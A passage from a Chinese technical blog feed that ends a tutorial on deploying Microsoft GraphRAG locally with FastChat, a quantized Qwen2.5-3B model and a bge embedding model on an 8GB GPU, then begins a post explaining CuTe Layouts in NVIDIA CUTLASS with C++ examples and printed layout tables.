这里仅作示例</span><br>curl https://www.gutenberg.org/cache/epub/24022/pg24022.txt &gt; ./ragtest/input/book.txt<br></code></pre></td></tr></table></figure><p>初始化 ragtest：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m graphrag.index --init --root ./ragtest<br></code></pre></td></tr></table></figure><p>初始化完成后，ragtest 文件夹内会存在一个 <code>settings.yaml</code> 的配置文件，其中包含了很多关于 graphrag 和 FastChat 连接的配置信息。因为我们是本地运行，所以需要我们根据实际情况做调整后部署 graphrag，以下是配置文件示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">encoding_model:</span> <span class="hljs-string">cl100k_base</span><span class="hljs-comment"># use encoding model: cl100k_base</span><br><span class="hljs-attr">skip_workflows:</span> []<br><span class="hljs-attr">llm:</span><br>  <span class="hljs-attr">api_key:</span> <span class="hljs-string">$&#123;GRAPHRAG_API_KEY&#125;</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">openai_chat</span>               <span class="hljs-comment"># or azure_openai_chat</span><br>  <span class="hljs-attr">model:</span> <span class="hljs-string">Qwen2.5-3B-Instruct-AWQ</span>  <span class="hljs-comment"># 对应了我们使用的 LLM 模型</span><br>  <span class="hljs-attr">model_supports_json:</span> <span class="hljs-literal">true</span>       <span class="hljs-comment"># recommended if this is available for your model.</span><br>  <span class="hljs-attr">max_tokens:</span> <span class="hljs-number">8000</span>                <span class="hljs-comment"># Qwen2.5 支持最大上下文 128K 我们这里先设 8K</span><br>  <span class="hljs-attr">request_timeout:</span> <span class="hljs-number">100.0</span><br>  <span class="hljs-attr">api_base:</span> <span class="hljs-string">http://localhost:8000/v1</span>  <span class="hljs-comment"># 对应了 openai server 的端口</span><br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-attr">embeddings:</span><br>  <span class="hljs-attr">async_mode:</span> <span class="hljs-string">threaded</span>          <span class="hljs-comment"># or asyncio </span><br>  <span class="hljs-attr">llm:</span><br>    <span class="hljs-attr">api_key:</span> <span class="hljs-string">$&#123;GRAPHRAG_API_KEY&#125;</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">openai_embedding</span>      <span class="hljs-comment"># or azure_openai_embedding</span><br>    <span class="hljs-attr">model:</span> <span class="hljs-string">bge-base-zh-v1.5</span>  <span class="hljs-comment"># 对应了我们使用的 embedding 模型</span><br>    <span class="hljs-attr">api_base:</span> <span class="hljs-string">http://localhost:8000/v1</span><span class="hljs-comment"># 对应了 openai server 的端口</span><br><span class="hljs-comment">## ...</span><br></code></pre></td></tr></table></figure><h3 id="启动模型">启动模型</h3><p>graphrag 能顺利运行的前提就是大模型能顺利运行，因此首先需要启动大模型后端。</p><p>Fastchat 是控制和管理大模型后端服务的框架，我们首先启动控制器：</p><p>启动 fastchat controller，默认端口 21001：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> python -u -m fastchat.serve.controller --host 0.0.0.0 \<br>  &gt;&gt; fastchat_controller.log  2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>使用 Fastchat 启动 vllm_worker Qwen2.5-3B-Instruct-AWQ 模型，启动的 vllm work 端口要与 controller 连接上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> python -u -m fastchat.serve.vllm_worker \<br>  --model-path ../Qwen2.5-3B-Instruct-AWQ --trust-remote-code --max-model-len 16000 \<br>  --host 0.0.0.0 --port 8001 --controller-address http://localhost:21001 \<br>  --worker-address http://localhost:8001 &gt;&gt; fastchat_worker_qwen.log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>在选择 LLM 这块我经过多次尝试，发现 8GB 显存的显卡最好选择 3B 的量化模型，太小的模型（1.5B）因为能力不足无法构建 graphrag 的知识图谱，而太大的模型（7B量化）就只能允许使用不到 5000 的上下文长度（model len）了。虽然 3B 量化模型很小，但 8GB 显存依然只能将 model-len 设置为 16K，过大的 model-len 会导致 KV-Cache 占用的显存超出 GPU 的显存能力范围。</p><p>从下面图可以看到，model-len 为 16K 已经是贴着 GPU 的最大内存在跑了：</p><p><img src="/img/LLM/graphrag/gpu.png" alt=""></p><p>使用 Fastchat 启动 bge-base-zh-v1.5 embedding 模型，同样端口要与 controller 连接上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> python -u -m fastchat.serve.model_worker \<br>  --model-path ../bge-base-zh-v1.5 \<br>  --host 0.0.0.0 --port 8002 --controller-address http://localhost:21001 \<br>  --worker-address http://localhost:8002 &gt;&gt; fastchat_worker_bge.log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>这些模型的权重文件数据都比较大，需要耐心等待若干分钟，待模型权重load完成，后端服务成功启动后，再启动 Fastchat 内的 openai API server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> python -m fastchat.serve.openai_api_server \<br>  --host 0.0.0.0 --port 8000 &gt;&gt; fastchat_server.log  2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>这一切都完成后，使用 <code>curl</code> 来验证一下模型是否都成功运行了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://localhost:8000/v1/models<br></code></pre></td></tr></table></figure><p>发现返回是这个，说明成功了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;object&quot;</span>:<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;Qwen2.5-3B-Instruct-AWQ&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:<span class="hljs-string">&quot;model&quot;</span>,<span class="hljs-string">&quot;created&quot;</span>:1729782366,<span class="hljs-string">&quot;owned_by&quot;</span>:<span class="hljs-string">&quot;fastchat&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>:<span class="hljs-string">&quot;Qwen2.5-3B-Instruct-AWQ&quot;</span>,<span class="hljs-string">&quot;parent&quot;</span>:null,<span class="hljs-string">&quot;permission&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;modelperm-HYV9FyQLtN3VmgJbB5JGZr&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:<span class="hljs-string">&quot;model_permission&quot;</span>,<span class="hljs-string">&quot;created&quot;</span>:1729782366,<span class="hljs-string">&quot;allow_create_engine&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;allow_sampling&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_logprobs&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_search_indices&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_view&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_fine_tuning&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;organization&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;group&quot;</span>:null,<span class="hljs-string">&quot;is_blocking&quot;</span>:<span class="hljs-literal">false</span>&#125;]&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;bge-base-zh-v1.5&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:<span class="hljs-string">&quot;model&quot;</span>,<span class="hljs-string">&quot;created&quot;</span>:1729782366,<span class="hljs-string">&quot;owned_by&quot;</span>:<span class="hljs-string">&quot;fastchat&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>:<span class="hljs-string">&quot;bge-base-zh-v1.5&quot;</span>,<span class="hljs-string">&quot;parent&quot;</span>:null,<span class="hljs-string">&quot;permission&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;modelperm-i6VUn5ahHcW6bN2FywLqV2&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:<span class="hljs-string">&quot;model_permission&quot;</span>,<span class="hljs-string">&quot;created&quot;</span>:1729782366,<span class="hljs-string">&quot;allow_create_engine&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;allow_sampling&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_logprobs&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_search_indices&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_view&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;allow_fine_tuning&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;organization&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;group&quot;</span>:null,<span class="hljs-string">&quot;is_blocking&quot;</span>:<span class="hljs-literal">false</span>&#125;]&#125;]&#125;<br></code></pre></td></tr></table></figure><p>然后，就是我们的 graphrag 大显身手的时候了！</p><h3 id="离线处理">离线处理</h3><p>启动 indexing pipeline，graphrag 开始调用后端的 embedding LLM 等模型对文档做离线切分，创建知识图谱，构建社区总结等等工作，该步骤会花费很长时间，可以离线完成：完成后，数据将会保存在 ragtest/output/${timestamp} 下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m graphrag.index --root ./ragtest<br></code></pre></td></tr></table></figure><p><img src="/img/LLM/graphrag/index.png" alt=""></p><p>我的 3060TI 孜孜不倦地跑了近二十分钟后，它终于构建出了知识图谱，完成了索引阶段的工作：</p><p><img src="/img/LLM/graphrag/success.png" alt=""></p><h3 id="在线查询">在线查询</h3><p>全局查询：当用户提出的问题需要模型查询多个文档块，做出综合性地、归纳性地回答时使用，</p><p>CLI 查询示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m graphrag.query \<br>--root ./ragtest \<br>--method global \<br><span class="hljs-string">&quot;What are the top themes in this story?&quot;</span><br></code></pre></td></tr></table></figure><p>局部查询：当用户提出的问题需要模型仔细查阅文档细节后将答案提前出来时使用，</p><p>CLI 查询示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m graphrag.query \<br>--root ./ragtest \<br>--method <span class="hljs-built_in">local</span> \<br><span class="hljs-string">&quot;Who is Scrooge, and what are his main relationships?&quot;</span><br></code></pre></td></tr></table></figure><p>更多使用细节和配置方法，请详细<a href="https://microsoft.github.io/graphrag/">参考官方文档</a></p><p>我自己的实践中，我使用<a href="https://www.gov.cn/zhengce/content/2020-12/31/content_5575804.htm">这篇文档</a>作为输入，随后针对我给出的文档，向 graphrag 提出了下面的问题，它给出了针对性的回答，以及模型内部自己知识的回答：</p><p><img src="/source/img/LLM/graphrag/example.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入 CUTLASS 之 CuTe 详解</title>
    <link href="/2024/08/18/2024-8-18-cute/"/>
    <url>/2024/08/18/2024-8-18-cute/</url>
    
    <content type="html"><![CDATA[<h1>什么是 CuTe</h1><p>CuTe 就是 CUDA Tensor。更准确地说，是 nvidia 在 <a href="https://github.com/NVIDIA/cutlass/tree/main">CUTLASS 3.0项目</a>中开发并提供的一组 C++ CUDA Template 抽象工具，它主要用于定义和操作在 CUDA 中的有多维分层 layout 的线程和数据。</p><p>CuTe 最主要的概念就是 Layout 和 Tensor：</p><ul><li>Layout&lt;Shape, Stride&gt; 可以把它理解成 function，作用就是将 n 维的连续坐标映射到 1 维的存储空间中</li><li>Tensor 有了 Layout 之后，就可以将指针传给 Tensor，于是 Tensor 就可以用来做计算了！</li></ul><p>此外，还需要特别注意的是，<strong>对于一个同样的连续地址空间，使用不同的 Layout 可以让 Tensor 的维度和排布不同</strong>。这就给了 CuTe 很大的灵活性，让它能够处理复杂的地址变换，帮助程序员摆脱 CUDA 编程中繁琐复杂的数据线程排布，让程序员可以专注于算法的逻辑描述。</p><p>当然，程序员也不太可能完全不关系数据（或线程）的排布方式，CuTe 也提供了许多健壮的 API 来帮助程序员更好地操控数据。</p><p>在真正的效果面前，文字都是苍白的。我们来看个具体的例子：</p><p>在 CuTe 之前，我们为了高性能地执行 CUDA 并行，需要花费大量时间在理解每个线程和线程块要处理哪部分数据，最终写出左边的“丑陋代码”：不仅不易阅读理解，更不容易调试和维护；而在 CuTe 之后，<strong>只要</strong>程序员掌握了它的 API，并正确地理清数据和线程的布局，准确地使用 layout 等模板类，代码可读性就能大幅提高了，也更容易调试修改。</p><center> <img src="/img/PP/before.PNG" width="45%"/> <img src="/img/PP/after.PNG" width="45%"/></center><p>轻松驾驭 CuTe 也绝非易事。首先，它用大量天书般的 C++ Template 编写，因此需要程序员有扎实的 C++ 功底；其次由于 CuTe 的核心抽象是分层地多维 layout，并且它必须足够强大到表示 CUDA 并行计算时的几乎一切操作，这也意味着有时要理解它也十分困难。总之，CuTe 的学习曲线非常陡峭，一点都不 cute ！</p><p>本博客致力于和大家一起探讨 CuTe 的相关使用，尽可能降低学习曲线。</p><p>在开始前，还是提醒各位读者，若有不明白的地方，可以速览参考<a href="https://github.com/NVIDIA/cutlass/blob/main/media/docs/cute/00_quickstart.md">官方文档</a>。</p><h1>Layout</h1><p><code>Layout</code> 是 CuTe 的核心抽象，弄懂了 <code>Layout</code> 就基本学会了一半 CuTe。<code>Layout</code> 概念提供了一种快速找到多维数据与坐标的映射关系，使得程序员更好地操作线程做并行运算，其本质就是如何快速地将“多维”坐标映射在“一维”的内存上，因此也可以说：</p><blockquote><p>Layouts 是整数（逻辑一维坐标）到整数（一维索引）的函数<br>Layouts are functions from integers to integers.</p></blockquote><h2 id="从例子开始">从例子开始</h2><p>先来看几个使用 Layout 来摆布数据的例子，直观地感受一下 CuTe Layout：</p><h3 id="例一">例一</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cute/tensor.hpp&gt;</span></span><br><span class="hljs-comment">// ...</span><br>  <span class="hljs-keyword">auto</span> tensor_shape = <span class="hljs-built_in">make_shape</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>  <span class="hljs-keyword">auto</span> tensor_stride = <span class="hljs-built_in">make_stride</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">print_layout</span>(<span class="hljs-built_in">make_layout</span>(tensor_shape, tensor_stride));<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">(2,3):(1,2)<br>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 2 </span><br>    +---+---+---+<br><span class="hljs-number"> 0 </span> |<span class="hljs-number"> 0 </span>|<span class="hljs-number"> 2 </span>|<span class="hljs-number"> 4 </span>|<br>    +---+---+---+<br><span class="hljs-number"> 1 </span> |<span class="hljs-number"> 1 </span>|<span class="hljs-number"> 3 </span>|<span class="hljs-number"> 5 </span>|<br>    +---+---+---+<br></code></pre></td></tr></table></figure><p>(2,3):(1,2) 中前面的括号表示 Tensor 的形状，后面的括号表示在不同维度下的 Stride。这里我们定义了一个 2x3 的 tensor，2 行 3 列。至于 stride，在前一维度（行维度），stride=1，表示映射到一维空间中，按行方向递增时，stride +1；在后一维度（列维度），stride=2，表示映射到一维空间中，按列方向递增时，stride +2。</p><h3 id="例二">例二</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">tensor_shape = <span class="hljs-built_in">make_shape</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>tensor_stride = <span class="hljs-built_in">make_stride</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">print_layout</span>(<span class="hljs-built_in">make_layout</span>(tensor_shape, tensor_stride));<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">(2,3):(3,1)<br>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 2 </span><br>    +---+---+---+<br><span class="hljs-number"> 0 </span> |<span class="hljs-number"> 0 </span>|<span class="hljs-number"> 1 </span>|<span class="hljs-number"> 2 </span>|<br>    +---+---+---+<br><span class="hljs-number"> 1 </span> |<span class="hljs-number"> 3 </span>|<span class="hljs-number"> 4 </span>|<span class="hljs-number"> 5 </span>|<br>    +---+---+---+<br></code></pre></td></tr></table></figure><p>定义了一个 2x3 的 tensor，2 行 3 列。至于 stride，在前一维度（行维度），stride=3，表示映射到一维空间中，按行方向递增时，stride +3；在后一维度（列维度），stride=2，表示映射到一维空间中，按列方向递增时，stride +1。</p><h3 id="例三">例三</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Layout layout = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span> (<span class="hljs-built_in">make_shape</span> (<span class="hljs-number">2</span>,<span class="hljs-number">2</span>), <span class="hljs-number">2</span>),<br>                            <span class="hljs-built_in">make_stride</span>(<span class="hljs-built_in">make_stride</span>(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>), <span class="hljs-number">1</span>));<br><span class="hljs-built_in">print_layout</span>(layout);<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">((2,2),2):((4,2),1)<br>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span><br>    +---+---+<br><span class="hljs-number"> 0 </span> |<span class="hljs-number"> 0 </span>|<span class="hljs-number"> 1 </span>|<br>    +---+---+<br><span class="hljs-number"> 1 </span> |<span class="hljs-number"> 4 </span>|<span class="hljs-number"> 5 </span>|<br>    +---+---+<br><span class="hljs-number"> 2 </span> |<span class="hljs-number"> 2 </span>|<span class="hljs-number"> 3 </span>|<br>    +---+---+<br><span class="hljs-number"> 3 </span> |<span class="hljs-number"> 6 </span>|<span class="hljs-number"> 7 </span>|<br>    +---+---+<br></code></pre></td></tr></table></figure><p>可以这样理解，在行维度上，我们有未知的子 tensor，该子 tensor 有两行（此为 shape 第一个2），行之间的 stride 为 4（所以 stride 第一个数为 4）；然后该子 tensor 在整个大 tensor 中会重复两次（此为 shape 的第二个 2），相对应地，子 tensor 间的 stride 为 2（此为 stride 的第二个 2）。</p><h3 id="例四">例四</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Layout layout = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span> (<span class="hljs-number">8</span>,<span class="hljs-built_in">make_shape</span> (<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)),<br>                            <span class="hljs-built_in">make_stride</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">make_stride</span>(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>)));<br><span class="hljs-built_in">print_layout</span>(layout);<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tap">(8,(2,2)):(2,(1,16))<br>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 3 </span><br>    +----+----+----+----+<br><span class="hljs-number"> 0 </span> | <span class="hljs-number"> 0 </span>| <span class="hljs-number"> 1 </span>|<span class="hljs-number"> 16 </span>|<span class="hljs-number"> 17 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 1 </span> | <span class="hljs-number"> 2 </span>| <span class="hljs-number"> 3 </span>|<span class="hljs-number"> 18 </span>|<span class="hljs-number"> 19 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 2 </span> | <span class="hljs-number"> 4 </span>| <span class="hljs-number"> 5 </span>|<span class="hljs-number"> 20 </span>|<span class="hljs-number"> 21 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 3 </span> | <span class="hljs-number"> 6 </span>| <span class="hljs-number"> 7 </span>|<span class="hljs-number"> 22 </span>|<span class="hljs-number"> 23 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 4 </span> | <span class="hljs-number"> 8 </span>| <span class="hljs-number"> 9 </span>|<span class="hljs-number"> 24 </span>|<span class="hljs-number"> 25 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 5 </span> |<span class="hljs-number"> 10 </span>|<span class="hljs-number"> 11 </span>|<span class="hljs-number"> 26 </span>|<span class="hljs-number"> 27 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 6 </span> |<span class="hljs-number"> 12 </span>|<span class="hljs-number"> 13 </span>|<span class="hljs-number"> 28 </span>|<span class="hljs-number"> 29 </span>|<br>    +----+----+----+----+<br><span class="hljs-number"> 7 </span> |<span class="hljs-number"> 14 </span>|<span class="hljs-number"> 15 </span>|<span class="hljs-number"> 30 </span>|<span class="hljs-number"> 31 </span>|<br>    +----+----+----+----+<br></code></pre></td></tr></table></figure><p>同理可知道，在列方向上，Shape 的第一个 2 表示，列内的子 tensor pattern 有两列，第二个 2 表示列一共有两个子 pattern 。Stride 的 1 表示在这个子 pattern 内的 stride 为 1，16 表示子 pattern 间的 stride 为 16。</p><h2 id="基本类型和概念">基本类型和概念</h2><p>相信前面的三个例子给到了读者对 Layout 的一个基本理解。因此在本小节中，我们来系统地梳理一下 CuTe Layout。</p><h3 id="Tuple">Tuple</h3><p>CuTe 以元组（tuple） 为起始，<code>cute::tuple</code> 包含了若干个元素组成的有限序列元组，其行为与 <code>std::tuple</code> 类似，但引入了一些 C++ templates arguments 的限制，并削减了部分实现以提升性能。</p><h3 id="IntTuple">IntTuple</h3><p>cuTe 还定义了 <code>IntTuple</code> 概念。为的就是实现上面例三、例四中令大家一时感到费解的 make_shape 嵌套。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">make_shape</span> (<span class="hljs-built_in">make_shape</span> (<span class="hljs-number">2</span>,<span class="hljs-number">2</span>), <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>IntTuple 既可作为一个整数，也可作为一个 Tuple 类型。这个递归定义允许我们构建任意嵌套的 Layout。以下任何一个都是 IntTuple 的有效模板参数：</p><ul><li><code>int&#123;2&#125;</code> 运行时整数，或者称之为动态整数，就是 C++ 的正常整数类型比如 <code>int</code> <code>size_t</code> 等等，只要是 <code>std::is_integral&lt;T&gt;</code> 的都是</li><li><code>Int&lt;3&gt;&#123;&#125;</code> 编译期整数，或称之为静态整数。CuTe 通过 <code>cute::C&lt;Value&gt;</code> 来定义 CUDA 兼容的静态整数类型，使得这些整数的计算能在编译期内完成。CuTe 将别名 <code>_1</code>、<code>_2</code>、<code>_3</code>等定义为 <code>Int&lt;1&gt;</code>、<code>Int&lt;2&gt;</code>、<code>Int&lt;3&gt;</code>等类型。</li><li>带有任何模板参数的 IntTuple，比如 <code>make_tuple(int&#123;2&#125;, Int&lt;3&gt;&#123;&#125;)</code></li></ul><p>CuTe 不仅将 IntTuple 用在了 Layout 上，还会在很多其他的地方比如 Step 和 Coord 等用到它。</p><p>IntTuple 的相关 API 操作：</p><ul><li><code>rank(IntTuple)</code>: 返回 IntTuple 的元素个数</li><li><code>get&lt;I&gt;(IntTuple)</code>: 返回 IntTuple 的第Ith 个元素</li><li><code>depth(IntTuple)</code>: 返回 IntTuple 的嵌套层数，整数为 0</li><li><code>size(IntTuple)</code>: 返回 IntTuple 中所有元素的乘积。</li></ul><h2 id="Layout-的使用">Layout 的使用</h2><p>Layout 本质上就是由一对 IntTuple 组成，Shape 和 Stride。Shape 定义了 Tensor 的大小，Stride 定义了元素间的距离。因此 Layout 也有许多与 IntTuple 类似的操作：</p><ul><li><code>rank(Layout)</code>: Layout 的维度，等同于 Shape 的 <code>rank(IntTuple)</code></li><li><code>get&lt;I&gt;(Layout)</code>: 返回 Layout 的第 Ith 个元素</li><li><code>depth(Layout)</code>: 返回 Layout 的嵌套层数，整数为 0</li><li><code>shape(Layout)</code>: The shape of the Layout</li><li><code>stride(Layout)</code>: The stride of the Layout</li><li><code>size(Layout)</code>: 返回 Layout 中所有元素的乘积。等同于 <code>size(shape(Layout))</code></li><li><code>cosize(Layout)</code>: The size of the Layout function’s codomain (not necessarily the range). Equivalent to A(size(A) - 1) + 1</li></ul><p>我们可以给出几个例子来练练手：</p><h3 id="例五">例五</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">Layout s2xd4 = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span>(Int&lt;<span class="hljs-number">2</span>&gt;&#123;&#125;,<span class="hljs-number">4</span>));<br>Layout s2xd4_a = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span> (Int&lt; <span class="hljs-number">2</span>&gt;&#123;&#125;,<span class="hljs-number">4</span>),<br>                             <span class="hljs-built_in">make_stride</span>(Int&lt;<span class="hljs-number">12</span>&gt;&#123;&#125;,Int&lt;<span class="hljs-number">1</span>&gt;&#123;&#125;));<br>Layout s2xd4_col = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span>(Int&lt;<span class="hljs-number">2</span>&gt;&#123;&#125;,<span class="hljs-number">4</span>),<br>                               LayoutLeft&#123;&#125;);<br>Layout s2xd4_row = <span class="hljs-built_in">make_layout</span>(<span class="hljs-built_in">make_shape</span>(Int&lt;<span class="hljs-number">2</span>&gt;&#123;&#125;,<span class="hljs-number">4</span>),<br>                               LayoutRight&#123;&#125;);<br></code></pre></td></tr></table></figure><p>如果我们想遍历 layout 内的所有元素，那么可以使用 <code>size</code> 来获得每个循环的上限，再使用 for 循环完成遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stride</span>&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print2D</span><span class="hljs-params">(Layout&lt;Shape,Stride&gt; <span class="hljs-type">const</span>&amp; layout)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span 